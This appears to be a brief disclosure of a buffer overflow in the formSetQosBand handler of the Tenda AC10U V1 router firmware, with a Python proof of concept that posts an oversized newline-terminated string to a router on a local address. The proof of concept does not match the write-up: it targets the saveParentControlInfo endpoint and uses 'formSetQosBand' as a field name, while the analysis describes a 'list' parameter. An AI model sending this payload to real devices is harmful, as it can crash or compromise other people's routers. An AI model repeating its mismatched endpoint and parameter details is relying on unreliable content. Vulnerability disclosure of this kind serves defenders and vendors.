# buffer overflow

## Tenda_AC10U_V1

version: V15.03.06.49

## Description:

There is a buffer overflow in httpd/formSetQosBand

## Source:

you may download it from : https://www.tendacn.com/download/detail-3795.html

## Analyse:


![](9.png)

get value from list ,send to setQosMiblist

![](10.png)

p eaqul list, if list contains '\n', get into if ,finally call strcpy, cause buff overflow



## POC
```
url = "http://192.168.1.13/goform/saveParentControlInfo"
payload = 'A'*300 + '\n'

r = requests.post(url, data={'formSetQosBand': payload})
``` 
